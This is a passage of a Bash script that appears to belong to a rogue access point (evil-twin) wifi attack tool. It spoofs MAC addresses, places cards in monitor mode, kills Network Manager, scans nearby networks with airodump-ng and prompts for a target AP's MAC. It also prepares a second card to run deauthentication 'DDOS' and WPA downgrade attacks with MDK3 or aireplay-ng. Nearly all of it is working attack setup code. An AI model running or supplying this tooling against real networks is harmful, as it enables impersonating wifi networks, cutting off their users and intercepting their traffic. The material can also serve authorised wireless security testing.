        if [[ $constat != ESSID:off/any ]] && [[ DNSONLINE == 0 ]]; then

	echo ""
	echo -e "$yel                           !!!!!$warn WARNING$yel!!!!!"
	echo -e "$info     Interface$yel $ICI$info may be associated to a network"
	echo -e "$info  but DNS access to internet has failed. In this case internet"
	echo -e "$info  web pages are not available. If you are sure the network providing"
        echo -e "$info  internet access is functioning then the network manager connection."
	echo -e "$info  needs to be reinitialized. DO NOT reset Network Manager. Open"
	echo -e "$info  Network Manager go to wifi settings. Choose a different connection"
	echo -e "$info  then return to the original network, Then retest."
	echo ""
	echo -e "     When ready to retest internet connection status enter $yel(y/Y)."
	echo -e "  To skip this test select $yel(n/N)$info."
	read retestcon

           
 fi	

DNSCONL_fn


		if [[ $retestcon == y  ]] || [[ $retestcon == Y  ]]; then

	DNSCONL_fn

	fi


}



            done

#############  End Musket Add  #############
            
            if [[ $ICI = "eth*" ]];then 
				echo -e "$warn\n    Not macchanging $ICI. Do it yourself if required $txtrst" # prevents connection problems from macchanging eth0 in a VM
				sleep 2
            else

		echo ""

### End Musket Entry End ###
            fi
            # store random internet MAC as ici_mac

		if [[ $ifselect == old ]]; then

            ici_mac=$(ifconfig $ICI | awk '{print $5}')
            sleep 0.5
            ici_mac=$(echo $ici_mac | awk '{print $1}')

			fi

		if [[ $ifselect == new ]]; then


ici_mac=$(ifconfig $ICI | awk '{if (($1 == "ether") || ($1 == "unspec")) {print $2}}') 2>/dev/null

		fi
            
        elif [[ $internet = n ]];then
            echo -e "$warn\n  Are you sure..?"
            sleep  0.5
            echo -e "$q\n  Press$yel y)es$q I'm sure, continue \n   or$yel n)o$q, set up internet$txtrst"
            read var
            if [[ $var = n ]];then
                internet=
                interface_fn
            fi
            if [[ $var = y ]];then
                if [[ $apusage = 3 || $apusage = a || $apusage = b || $apusage = c ]];then
                    echo -e "$warn\n  Duh, won't work without an internet interface. Start again"
                    sleep 2
                    interface_fn
                fi
            fi
        elif [[ $internet = * ]];then
            echo -e "$warn\n  BooBoo"
            sleep 2
            interface_fn
        fi

    fi

clear
echo -e "$txtrst"



echo -e "$bold$info  RogueAP Wireless Interface"
echo -e "$warn  ___________________________$norm"

airmon-old_fn

	while [[ -z $API ]]; do
	echo ""
        echo -e "$def     Available wireless interfaces And Mac Addresses:$txtrst"
	echo ""
#	if [[ $internet == "y" ]]; then

#	echo -e "$def  Check to insure$yel $ICI$def has the correct$yel mac$def address and continue:$txtrst"

#			fi

		if [[ $ifselect == old ]]; then

		ifconfig -a | grep -e wlan -e eth -e ath | awk '{ print $1"   "$5 }' # displays available interfaces

				fi

		if [[ $ifselect == new ]]; then

		ifconfig -a | grep -e wlan -e eth -e ath | awk '{if (($1 != "ether") || (substr($1,length($1),1) == ":")) {print $1}; if (($1 == "ether") || ($1 == "unspec")) {print $2}}'

				fi

		echo ""		
		echo -e "$info     If the rogueAPs' device will not be used to perform active"
		echo -e "$info  DDOS operations using MDK3 or aireplay-ng, then the device"
 		echo -e "$info  doesnot need to support packet injection.$txtrst"
		echo ""
		echo -e "$q     Enter the Wireless interface(i.e.$yel wlan0,wlan1$q etc.) to support the rogueAP?$txtrst"

		if [[ $internet = "y" ]]; then

                echo -e "$info  You cannot use $yel $ICI $info as this device is providing internet access!!!$txtrst"

			fi
 
		read API

		dev_check_var=$API
		dev_check_fn
			if [[ $dev_check == "fail" ]];then
                echo -e "$warn\n  Start again"
                sleep 1
				API= # nulled
                ICI=
                interface=
		constat=
				interface_fn
			fi
		if [[ $API = $ICI ]]; then # can't use same interface for internet and AP
			echo -e "$warn\n  $API is in use, stupid. Try another interface"
			sleep 2

			interface_fn

				fi

	constat=$(iwconfig $API | grep $API | awk '{ print $4 }')

	if [[ $constat != Mode:Monitor ]] && [[ $constat != ESSID:off/any ]]; then

	echo ""
	echo -e "$yel                       !!!!!$warn WARNING$yel!!!!!"
	echo -e "$info     Interface$yel $API$info may be associated to a Network!!!"
	echo -e "$info  Insure interface$yel $API$info is NOT associated to any Network."
	echo -e "$info  thru Network Manager. If associated the$yel rogueAP$info will not function."
	echo ""
	echo -e "$inp  When ready type any key to continue....$txtrst"
	read continue
	constat=

		fi

	done

########## Musket Add Start ###########
#### Places back in managed mode to avoid macchanging errors and association warn error ##### 

	if [[ $internet = "n" ]] && [[ $KALI_TYPE -eq 2 || KALI_TYPE -eq 3 ]]; then

CHKKILLTEST=ZZZZ

until  [[ $CHKKILLTEST == y ]] || [[ $CHKKILLTEST == Y ]]; do  

clear
echo ""
echo ""
echo -e "$bold$info  Use of airmon-ng check kill"
echo -e "$warn  ___________________________$norm"

echo ""
echo ""
echo -e "$q     As internet access is not provide. Network Manager(NM) is not required."
echo -e "  Do you wish to employ airmon-ng check kill to turn off NM activity?"
echo ""
echo -e "$info     If you are unsure at this time select$yel (y/Y)$info."
echo -e "$info  At program shutdown Network Manager functions will be restored."  
echo ""
echo -e "$inp     Select$yel (y/Y)$inp to use airmon-ng check kill command."
echo -e "$inp  Enter$yel (n/N)$inp to not use this command.$txtrst"      

read CHKKILL

	while true
	do

echo ""
echo -e "$inp  You entered $yel$CHKKILL$inp type $yel(y/Y)$inp to confirm or $yel(n/N)$inp to try again.$txtrst"
read CHKKILLTEST

	case $CHKKILLTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done

		done

if [[ $CHKKILL == y ]] || [[ $CHKKILL == Y ]]; then 

		airmon-ng check kill
		echo "     Running airmon-ng check kill"		
		sleep 3

		fi

			fi

ifconfig $API down &> /dev/null
iwconfig $API mode managed &> /dev/null
ifconfig $API up &> /dev/null

#########Musket Add End #############
MACSELTEST=ZZZ

iw mon0 del &> /dev/null
iw mon1 del &> /dev/null
iw mon2 del &> /dev/null
iw mon0mon del &> /dev/null

until  [[ $MACSELTEST == y ]] || [[ $MACSELTEST == Y ]]; do  

clear

echo ""
echo -e "$bold$info  RogueAP Mac Address"
echo -e "$warn  ___________________$norm"

echo ""
echo ""
echo -e "$q     Do you wish to assign$yel(a/A)$q a specific mac address"
echo -e "  to the$yel rogueAP$q or use a random$yel(r/R)$q mac address?."
echo ""
echo -e "$info  If you are unsure at this time select$yel (r/R)$info. You will be given a chance"
echo -e "  to choose a more specific mac address later in the program setup."
echo ""
echo -e "$inp      Enter$yel (a/A)$inp to assign a specific mac address."
echo -e "$inp      Enter$yel (r/R)$inp to use a random mac address.$txtrst"      

read MACSEL

	while true
	do

      if [ $MACSEL == r ] || [ $MACSEL == R ] || [ $MACSEL == a ] || [ $MACSEL == A ]; then

echo ""
echo -e "$inp  You entered$yel $MACSEL$info type$yel (y/Y)$inp to confirm or$yel (n/N)$inp to try again.$txtrst"

         else

echo ""
echo -e "$warn Error type $yel (n/N)$inp to try again.$txtrst"

			fi

read MACSELTEST

	case $MACSELTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done

		done

if  [ $MACSEL == a ] || [ $MACSEL == A ]; then
	clear
	echo ""
	echo ""
	echo -e "$inp    Enter the mac address to assign to your wifi device and monitor.$txtrst"
        echo -e "$inp  Enter in this format$yel 55:44:33:22:11:00$inp ONLY!!!"
        echo ""
        echo -e "$info Some error handling exists for this entry.$txtrst"
	read ap_mac

	set_ap_mac_fn

		fi

#########################

#Set assigned mac

if  [ $MACSEL == a ] || [ $MACSEL == A ]; then

echo -e "$txtrst"
ifconfig $API down &> /dev/null
macchanger -m $ap_mac $API
sleep 2  # Need time to complete op
ifconfig $API up

	fi

#Set random mac to device

if [ $MACSEL == r ] || [ $MACSEL == R ]; then

echo -e "$txtrst"
ifconfig $API down &> /dev/null
macchanger -A $API
sleep 2  # Need time to complete op
ifconfig $API up

	fi

#Start two monitors then split if 2nd device used

echo -e "$txtrst  Starting mon0...."
echo ""
airmon-old_fn start $API &> /dev/null
sleep 2
#echo -e "$txtrst  Starting mon1......."
#airmon-old_fn start $API &> /dev/null
#sleep 2

MONDEV_fn()
{
#######
MONTEST=ZZZ
until [ $MONTEST == y ] || [ $MONTEST == Y ]; do  
echo -e "$txtrst "
monap=
clear
echo ""
echo -e "$bold$info  RogueAP Wireless Monitor Interface"
echo -e "$warn  __________________________________$norm"

airmon-old_fn
echo ""
echo -e "$q    What wireless monitor interface $yel(i.e. mon0, mon1)$q is linked to"
echo -e "$yel  $API$q the rogueAP's assigned device?"
echo -e "$warn     DO NOT select devices like$yel wlan0$warn or$yel wlan1$warn. Enter only the associated"
echo -e "$warn  monitors to the device like$yel mon0$warn etc."

echo ""
echo -e "$info    A listing of devices and their associated monitors are shown above.$txtrst"
read monap

	while true
	do

echo ""
echo -e "$inp  You entered $yel$monap$inp type $yel(y/Y)$inp to confirm or $yel(n/N)$inp to try again.$txtrst"
read MONTEST

	case $MONTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done

		done

	ifconfig $monap &> /dev/null

	if [ $? -ne 0 ] || [ $monap == mon ]; then  # corrects ifconfig bug if wlan/eth/ath/mon entered
	echo -e "$warn\n  Device does NOT exist."
	#monap=
	sleep 3
	MONDEV_fn

	else

	if [[ $monap == mon[0-20] ]]; then

	echo -e "$txtrst  Correct device type continuing"
	sleep 3

	else

	echo -e "$warn   !!!ERROR You entered$yel $monap$warn !!!"
	echo -e "$warn Incorrect device type or device doesnot exist."
		#monap=
		sleep 3
		MONDEV_fn 

		fi
			fi


}

MONDEV_fn

sleep 1

		if [[ $ifselect == old ]]; then

            VARMAC=$(ifconfig $API | awk '{print $5}')
            sleep 0.5
            VARMAC=$(echo $VARMAC | awk '{print $1}')

			fi

		if [[ $ifselect == new ]]; then

VARMAC=$(ifconfig $API | awk '{if (($1 == "ether") || ($1 == "unspec")) {print $2}}') 2>/dev/null

#VARMAC=$(ifconfig $API | awk '{if ($1 == "ether") {print $2}}') 2>/dev/null

		fi



sleep 2
echo -e "$txtrst"

ifconfig $monap down
sleep .3
macchanger -m $VARMAC $monap
sleep 2 # Need time to complete op
ifconfig $monap up 2>/dev/null
sleep .3

ifconfig $API down
sleep .3
iwconfig $API mode monitor
sleep .3
ifconfig $API up
sleep .3

ifconfig $monap down
sleep .3
iwconfig $monap mode monitor
sleep .3
ifconfig $monap up 2>/dev/null
sleep .3

echo -e "$txtrst"


ap_mac=$VARMAC #Set if random mac used of ap_mac null

use2nddev_fn()

{
clear

use2ndtest=ZZZ

	until  [ $use2ndtest == y ] || [ $use2ndtest == Y ]; do

		if [[ $internet == y ]]; then
clear
echo ""
echo -e "$bold$info  2nd Wifi Device(Optional) to Conduct the DDOS or support RogueAP Clones?"
echo -e "$warn  _______________________________________________________________$norm"

	echo ""
	echo -e "$info     The wifi device supporting the RogueAP can also conduct the"
	echo -e "  DDOS. However this rqrs the RogueAP channel to be the same as the"
	echo -e "  TargetAP. If you wish to employ a second wifi device to conduct the"
	echo -e "  DDOS and/or assign the RogueAP to a different channel from the TargetAP,"
	echo -e "  you must setup the 2nd device at this time. This device cannot be$yel" 
	echo -e "  $ICI$info as it is either a wired interface or wireless device"
	echo -e "  supporting the internet connection. It cannot be$yel $API$info as"
	echo -e "  this device is supporting the RogueAP."
	echo -e "  $info     Current devices available and associated monitors are;$txtrst"

	airmon-old_fn

	echo -e "$q     Do you wish to use a 2nd device to perform the DDOS(Optional)?"
	echo -e "$info  If MDK3 or aireplay-ng -0 will perform the DDOS, the device MUST"
	echo -e "$info  support packet injection and cannot be$yel $ICI$info, $yel$API$info"
        echo -e "$info  or associated monitors like $yel $monap$info etc."
	echo -e ""
	echo ""
	echo -e "$inp     Select$yel (y/Y)$inp to setup a 2nd wifi device to support DDOS."
	echo -e "$inp     Enter$yel (n/N)$inp to NOT setup a 2nd wifi device.$txtrst"
	read use2nd

		fi

	if [[ $internet == n ]]; then

echo -e "$bold$info  2nd Wifi Device to Conduct the DDOS?"
echo -e "$warn  ____________________________________$norm"

	echo ""
	echo -e "$info     The wifi device supporting the RogueAP can conduct ALL DDOS"
	echo -e "  operations. However this rqrs the RogueAP channel to be the same as"
	echo -e "  the TargetAP. If you wish to employ a second wifi device to conduct"
	echo -e "  the DDOS and assign the RogueAP to a different channel from the"
	echo -e "  TargetAP you must setup this 2nd device a this time. A second wifi"
	echo -e "  device allows the employment of mdk3 WPA downgrade if TargetAP and"
	echo -e "  RogueAP are on different channels."
	echo -e "       Current devices and their associated monitors available are;$txtrst"

airmon-old_fn

	echo ""
	echo -e "$info     This device MUST support packet injection and cannot"
        echo -e "$info  be$yel $API$info, any associated monitors like $yel$monap$info or"
	echo -e "$info  a wired device."
	echo ""
	echo -e "$inp     Select$yel (y/Y)$inp to setup a 2nd wifi device to support DDOS."
	echo -e "$inp  Select$yel (n/N)$inp to NOT setup a 2nd wifi device.$txtrst"
	read use2nd

		fi

	while true
	do
	echo ""

echo -e "$inp  You entered $yel$use2nd$info type $yel(y/Y)$inp to confirm or $yel(n/N)$inp to try again.$txtrst"
read use2ndtest

	case $use2ndtest in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done

if [[ $use2nd != y ]] && [[ $use2nd != Y ]] && [[ $use2nd != n ]] && [[ $use2nd != N ]]; then

	clear
	echo ""
	echo -e  "$warn  Wrong input enter $yel(y/Y/n/N)$warn ONLY - try again!!!"
	sleep 3
	use2ndtest=ZZZ

		fi

		done


	if [[ $use2nd == y ]] || [[ $use2nd == Y ]]; then 


use2dostest=ZZZ

	until [[ $use2dostest == y ]] || [[ $use2dostest == Y ]]; do


echo -e "$bold$info  2nd Wifi Device to Conduct the DDOS?"
echo -e "$warn  ____________________________________$norm"


clear
echo ""
echo -e "$bold$info  2nd wifi Selection - Devices and associated monitors available:$txtrst"
echo -e "$warn  _______________________________________________________________$norm"

airmon-old_fn

	echo -e "$info     Select the 2nd device to perform the DDOS.$txtrst"


		if [[ $internet = y ]]; then

	echo -e "$info  This device MUST support packet injection and cannot be$yel $ICI$info, $yel$API$info or any associated monitors such as$yel $monap$info etc."

				fi

		if  [[ $internet = y ]] && [[ $KALI_TYPE -eq 2 || $KALI_TYPE -eq 3 ]]; then

	echo -e "$warn     Insure you uncheck any connect automatically setting for this thru"
	echo -e "$warn  thru Network-Manager."

				fi

		if [[ $internet = n ]]; then

	echo -e "$info  This device MUST support packet injection and cannot"
        echo -e "$info  be$yel $API$info, any associated monitors like $yel$monap$info or"
	echo -e "$info  a wired device."

	echo -e "$inp     Enter wifi device i.e.$yel(wlan0 wlan1)$inp etc?$txtrst"

			fi
		echo -e "$txtrst"
		read use2dos

	while true
	do
	echo ""

echo -e "$inp  You entered $yel$use2dos$inp type $yel(y/Y)$inp to confirm or $yel(n/N)$inp to try again.$txtrst"
read use2dostest

	case $use2dostest in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"


	done

		done


	if [[ $internet = y ]]; then

		if [[ $use2dos == $ICI || $use2dos == $API || $use2dos == $monap || $use2dos == mon[0-20] ]]; then
			
			echo -e "$warn  !!!$use2dos already in use or not a device. Select another device!!!"
			use2dos=
			sleep 3
			use2nddev_fn

			fi

				fi

	if [[ $internet = n ]]; then

		if [[ $use2dos == $API || $use2dos == $monap || $use2dos == mon[0-20] ]]; then
			
			echo -e "$warn  !!!$use2dos already in use or not a device. Select another device!!!"
			use2dos=
			sleep 3
			use2nddev_fn

			fi

				fi

	ifconfig $use2dos &> /dev/null

	if [ $? -ne 0 ] || [ $use2dos == wlan ] || [ $use2dos == eth ] || [ $use2dos == ath ] || [ $use2dos == mon ]  ; then  # corrects ifconfig bug if wlan/eth/ath/mon entered
	echo -e "$warn\n  Device does NOT exist."
	use2dos=
  	sleep 3
	use2nddev_fn

				fi


			fi


# Place in mon mode vefore entering function to prevent multiple mons when error

#if  [[ $use2nd == y ]] || [[ $use2nd == Y ]]; then

#echo -e "$txtrst"
#echo ""
#echo -e "Placing $use2dos in monitor mode......."
#airmon-old_fn start $use2dos &> /dev/null
#sleep 2

#	fi


}

TWOMONTEST=ZZZ

twodevmon_fn()

{

if  [[ $use2nd == y ]] || [[ $use2nd == Y ]]; then

until [[ $TWOMONTEST == y ]]  || [[ $TWOMONTEST == Y ]]; do  

clear

echo ""
echo -e "$bold$info  2nd Wireless Monitor Interface"
echo -e "$warn  ______________________________$norm"

airmon-old_fn

		if [[ $internet = y ]]; then

echo ""
echo -e "$q    What wireless monitor interface $yel(i.e. mon0, mon1, mon2)$q seen above,"
echo -e "$q  has been assigned to$yel $use2dos$q?"
echo -e "$warn     DO NOT select devices like$yel $ICI $API, $use2dos$warn or$yel $monap$warn associated to$yel $API$warn."
echo ""
echo -e "$info    A listing of devices and their associated monitors are shown above.$txtrst"
	read twomon

			fi

		if [[ $internet = n ]]; then

echo ""
echo -e "$q    What wireless monitor interface $yel(i.e. mon0, mon1, mon2)$q has"
echo -e "  been assigned to$yel $use2dos$q?"
echo -e "$warn     DO NOT select devices like$yel $API, $use2dos$warn or$yel $monap$warn associated to$yel $API$warn ."
echo ""
echo -e "$info    A listing of devices and their associated monitors are shown above.$txtrst"
	read twomon

			fi

	while true
	do

echo ""
echo -e "$inp  You entered$yel $twomon$inp type $yel(y/Y)$inp to confirm or $yel(n/N)$inp to try again.$txtrst"
	read TWOMONTEST

	case $TWOMONTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done

	ifconfig $twomon &> /dev/null

	if [[ $? -ne 0 ]] || [[ $twomon == mon ]]; then  # corrects ifconfig bug if wlan/eth/ath/mon entered
	echo -e "$warn\n  Device does NOT exist."
	sleep 3
#	twodevmon_fn
	TWOMONTEST=

	fi

#	if [[ $twomon == mon[0-20] ]] then

#	echo -e "$txtrst  Correct device type continuing"
#	sleep 3

#		else

#	echo -e "$warn   !!!ERROR You entered$yel $twomon$warn !!!"
#	echo -e "$warn Enter associated monitor like$yel mon0..mon1...$warn ONLY Not A Device."
#		sleep 3
		#twodevmon_fn
#		TWOMONTEST=

#		fi

		if [[ $internet = y ]]; then

	if [[ $twomon == $ICI ]] || [[ $twomon == $API ]] || [[ $twomon == $monap ]] || [[ $twomon == $use2dos ]]; then
	
		echo -e "$warn  !!!Device already in use try again!!!"
		sleep 3
#		twodevmon_fn
		TWOMONTEST=
		fi

			fi	

		if [[ $internet = n ]]; then

	if [[ $twomon == $API ]] || [[ $twomon == $monap ]] || [[ $twomon == $use2dos ]]; then 

			echo -e "$warn  !!!Device already in use try again!!!"
			sleep 3
#			twodevmon_fn
			TWOMONTEST=

				fi

					fi

			done

		fi

}

sleep 4 # These sleep commands important script may loop back without them
 
use2nddev_fn

sleep 2 # These sleep commands important script may loop back without them

if  [[ $use2nd == y ]] || [[ $use2nd == Y ]]; then

echo -e "$txtrst"
echo ""
echo -e "Placing $use2dos in monitor mode......."
airmon-old_fn start $use2dos &> /dev/null
sleep 4

	fi

sleep 4 # These sleep commands important script may loop back without them

twodevmon_fn



}

# ~~~~~~~~~~ Scan Functions ~~~~~~~~~~ #

initial_scan_fn()

{

	if [[ ! -z $use2dos ]]; then

		if [ $internet == y ]; then


			if [ $use2dos == $ICI ] || [ $use2dos == $API ] || [ $use2dos == $monap ]; then
					echo -e "$warn Error $use2dos using wrong device retry."
					sleep 3
					use2dos=
					use2nddev_fn			
				fi

			fi

		if [ $internet == n ]; then


			if [ $use2dos == $API ] || [ $use2dos == $monap ]; then
					echo -e "$warn Error $use2dos using wrong device retry."
					use2dos=
					sleep 3
					use2nddev_fn			
				fi

			fi

		if  [[ $use2nd == y ]] || [[ $use2nd == Y ]]; then

				twodevmon_fn

					fi
						fi


monscan_start_fn()

{

	if [[ $use2nd == y ]] || [[ $use2nd == Y ]]; then

		echo -e "$info\n  Starting new monitor interface with 2nd device for scanning...$txtrst"
		sleep 1
		
		echo -e "$txtrst"
		ifconfig $use2dos down &> /dev/null
		sleep .1
		macchanger -A $use2dos
		sleep 3  # Need time for device complete op 
		ifconfig $use2dos up
		sleep .1


		if [[ $ifselect == old ]]; then

            VARMAC2=$(ifconfig $use2dos | awk '{print $5}')
            sleep 0.5
            VARMAC2=$(echo $VARMAC2 | awk '{print $1}')

			fi

		if [[ $ifselect == new ]]; then

VARMAC2=$(ifconfig $use2dos | awk '{if (($1 == "ether") || ($1 == "unspec")) {print $2}}') 2>/dev/null

			fi

		echo -e "$txtrst"
		echo -e "$info\n Placing $use2dos in mode manage to change mac address $txtrst"
		ifconfig $use2dos down
		sleep .1
		iwconfig $use2dos mode manage &> /dev/null
		sleep .1
		ifconfig $use2dos up
		sleep .1
		ifconfig $twomon down
		sleep .1
		macchanger -m $VARMAC2 $twomon
		sleep 3 # Need time to complete op
		ifconfig $twomon up
		sleep .1
		ifconfig $use2dos down
		sleep .1
		iwconfig $use2dos mode monitor
		sleep .1
		ifconfig $use2dos up
		sleep .1
		monscan=$twomon

			fi

	if [[ $use2nd == n ]] || [[ $use2nd == N ]] && [[ $monap == mon0 ]]; then



		echo -e "$txtrst"
		echo -e "  All operations except internet reception thru $API"
		echo -e "  Placing $API in monitor mode......."
		airmon-old_fn start $API &> /dev/null
		sleep 4

		echo -e "$txtrst"
		echo -e "$info\n Placing $API in mode manage to change mac address $txtrst"
		ifconfig $API down
		sleep .1
		iwconfig $API mode manage &> /dev/null
		sleep .1
		ifconfig $API up
		sleep .1
		ifconfig mon1 down
		sleep .1
		macchanger -r mon1
		sleep 2 # Need time to complete op
		ifconfig mon1 up
		sleep .1
		ifconfig $API down
		sleep .1
		iwconfig $API mode monitor
		sleep .1
		ifconfig $API up
		sleep .1
		monscan=mon1

		fi

}

	monscan_start_fn


	clear
	echo ""
	echo -e "$bold$info  TargetAP and RogueAP Mac Addresses"
	echo -e "$warn  __________________________________$norm"
	echo ""
	echo -e "$info     A all channel scan to survey Networks will be run at "
	echo -e "$info  this time. This scan will provide menu listing and assist"
	echo -e "$info  in setting up channels, mac addresses and ESSIDs of RogueAP,"
	echo -e "$info  and RogueAP WPA Clone."
#
#	echo -e ""
#	echo -e "$inp     Select$yel (y)$inp to scan for targetAP details(recommended)."
#	echo -e "$inp   Select$yel (n)$inp to skip scan(NOT Advised).$txtrst"
#	read initial_scan

	initial_scan=y
	sleep 3

	if [ $initial_scan = "y" ];then

        xterm -g 100x20-0-0 -T "airodump-ng all channel scan" -e "airodump-ng "$monscan"  2>&1 | tee /tmp/airocap.txt" &  killairopid=$!

		if [ $initial_scan = "y" ]; then


echo ""
echo -e "$bold$info  Airodump-ng All Channel Scan"
echo -e "$warn  ____________________________$norm"
echo ""
echo -e "$info     Airodump-ng is scanning for active Networks. When data required"
echo -e "$info  is seen or scan in the airodump-ng xterm window not required"
echo -e "$info  press$yel (c/C)$info to continue....$txtrst"
read continue

#####################################
CHOSEMCROGTEST=ZZZ

until [[ $CHOSEMCTARTEST == y ]] || [[ $CHOSEMTARTEST == Y ]]; do
echo -e "$txtrst "

	clear
	echo ""
	echo -e "$info     Setting the$yel TargetAP$info Mac Address"
        echo -e "$warn     _____________________________________"
	echo ""
	echo -e "$info     Enter a mac address for the TargetAP?"
        echo -e "$info  A mac address is required by processes conducting any DDOS operation."
	echo -e "$warn      !!!! If no targetAP is specified !!!!"
	echo -e "$warn  then all active and passive DOS processes!!!" 
	echo -e "$warn               WILL NOT FUNCTION"
	echo ""
	echo -e "$inp  Select$yel(y/Y)$inp to enter a mac address(suggested)."
	echo -e "$inp  Enter$yel(n/N)$inp to skip this entry.$txtrst"
        read CHOSEMCTAR

	while true
	do

echo ""
echo -e "$inp  You entered$yel $CHOSEMCTAR$inp type$yel (y/Y)$inp to confirm or$yel (n/N)$inp to try again.$txtrst"
read CHOSEMCTARTEST

	case $CHOSEMCTARTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done

if [[ $CHOSEMCTAR != y ]] && [[ $CHOSEMCTAR != Y ]] && [[ $CHOSEMCTAR != n ]] && [[ $CHOSEMCTAR != N ]]; then

	clear
	echo ""
	echo -e  "$warn  Wrong input enter $yel(y/Y/n/N)$warn ONLY - try again!!!"
	sleep 3
	CHOSEMCTARTEST=ZZZ

		fi

		done

if [[ $CHOSEMCTAR == y ]] || [[ $CHOSEMCTAR == Y ]]; then

MANTARGTEST=ZZZ

until [ $MANTARGTEST == y ] || [ $MANTARGTEST == Y ]; do

echo -e "$txtrst "
clear
echo ""
echo -e "$bold$info  Entering the$yel TargetAP$info Mac Address"
echo -e "$warn  _________________________________$norm"
echo "" 
echo -e "$info     You can$yel manually$info enter the mac address of the targetAP, or$yel clone"
echo -e "$info  a mac address of an existing network from a menu list of Networks seen?$txtrst"
echo -e "$info     Note: Cloned mac addresses are copied from a list and cannot be altered."
echo -e "$info  Consult the airodump-ng scan in the xterm window to see if the targetAP"
echo -e "$info  is listed."

echo ""
echo -e "$inp     Select$yel (y/Y)$inp to$yel manually$inp enter a mac address."
echo -e "$inp  Enter$yel (n/N)$inp to$yel clone$inp a mac address from an existing network.

$txtrst"
read MANTARG

	while true
	do
	echo ""

echo -e "$inp  You entered $yel$MANTARG$inp type $yel(y/Y)$inp to confirm or $yel(n/N)$inp to try again.$txtrst"
read MANTARGTEST

	case $MANTARGTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done

if [[ $MANTARG != y ]] && [[ $MANTARG != Y ]] && [[ $MANTARG != n ]] && [[ $MANTARG != N ]]; then

	clear
	echo ""
	echo -e  "$warn  Wrong input enter $yel(y/Y/n/N)$warn ONLY - try again!!!"
	sleep 3
	MANTARGTEST=ZZZ

		fi

		done


if [[ $MANTARG == y ]] || [[ $MANTARG == Y ]]; then

MACMANTEST=ZZZ

until [[ $MACMANTEST == y ]] || [[ $MACMANTEST == Y ]]; do
echo -e "$txtrst "
clear

#  WEP not required only Open and WPA
#  Note text output for single channel differs from -c hopping
#  Rescan on single -c  requires different awk handeling

#  Start the strip
#  Print WPA  airocap 1 for WPA

cat < /tmp/airocap.txt | awk -F' ' '{ if(($8 == "WPA2") || ($8 == "WPA")) {print $1 " " $8 " " $11 " " $12 " " $13 " " $14 }}' | sort -u | sed 's/^[ \t]*//;s/[ \t]*$//' > /tmp/airocap1.txt

# Print Open ESSID

cat < /tmp/airocap.txt | awk -F' ' '{ if($8 == "OPN") {print $1 " " $8 " " $9 " " $10 " " $11 " " $12 " " $13 " " $14 }}' | sort -u | sed 's/^[ \t]*//;s/[ \t]*$//' > /tmp/airocap2.txt

cat < /tmp/airocap.txt | awk -F' ' '{ if($8 == ".") {print $1 " " $9 " " $10 " " $11 " " $12 " " $13 " " $14 }}' | sort -u | sed 's/^[ \t]*//;s/[ \t]*$//' >> /tmp/airocap2.txt

cat /tmp/airocap2.txt >> /tmp/airocap1.txt

cat /tmp/airocap1.txt | unix2dos | sort -u > /tmp/airocap3.txt

#cat < /tmp/airocap1.txt | awk '{print $1 }'  > /tmp/airocap4.txt

#  BSSIDAVAIL=$(cat /tmp/airocap4.txt | nl -ba -w 1  -s ': ')

ESSIDAVAIL=$(cat /tmp/airocap3.txt)

clear
echo -e "$txtrst"
echo "$ESSIDAVAIL" | sed 's/^/       /'

	echo ""
	echo -e "$info     A list of existing Networks for reference ONLY are shown above."
	echo -e "$info  You can drag the mouse across these addresses then copy, paste or"
	echo -e "$info  alter as required."  
	echo -e "$inp     Enter the mac address of targetAP. Error handling exists"
	echo -e "$inp  for this entry. Enter in this format$yel 55:44:33:22:11:00$inp only!.$txtrst"
	read tarbssid

	while true
	do
	echo ""

echo -e "$inp  You entered $yel$tarbssid$inp type $yel(y/Y)$inp to confirm or $yel(n/N)$inp to try again.$txtrst"
read MACMANTEST

	case $MACMANTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e  "$warn  !!!Wrong input try again!!!$txtrst"

	done

#####mac error test start
# Insure upper case to avoid problems w/ other programs

tarbssid=$(echo $tarbssid | awk '{print toupper($0)}')

MACPUNCT=":::::"
PUNCTEST=`echo "$tarbssid" | tr -d -c ".[:punct:]"`
MACALNUM=`echo "$tarbssid" | tr -d -c ".[:alnum:]"`

if [[ $MACALNUM =~ [0-9A-Fa-f]{12} ]]; then

	testhex=0

	else

	testhex=1

	fi

if [[ "$PUNCTEST" != "$MACPUNCT" ]] || [[ ${#tarbssid} != 17 ]] || [[ $testhex == 1 ]]; then

     echo -e "$warn  Mac Address FORMAT incorrect check length, symbol= : use hex character ONLY$txtrst"
	sleep 3

	MACMANTEST=ZZZ

	else

	echo -e "$info  Correct mac address format continuing...."
	sleep 3

		fi

#####mac error test end

		done

	fi #if [[ $MANROGUE == y ]]

if [[ $MANTARG == n ]] || [[ $MANTARG == N ]]; then

MACLONETEST=ZZZ

until  [[ $MACLONETEST == y ]] || [[ $MACLONETEST == Y ]]; do  

clear
echo -e "$txtrst"

#  WEP not required only Open and WPA
#  Note text output for single channel differs from -c hopping
#  Rescan on single -c  requires different handeling

#  Start the strip
#  Print WPA  airocap 1 for WPA

cat < /tmp/airocap.txt | awk -F' ' '{ if(($8 == "WPA2") || ($8 == "WPA")) {print $1 " " $8 " " $11 " " $12 " " $13 " " $14 " " $15 }}' | sort -u | sed 's/^[ \t]*//;s/[ \t]*$//' > /tmp/airocap1.txt

# Print Open ESSID

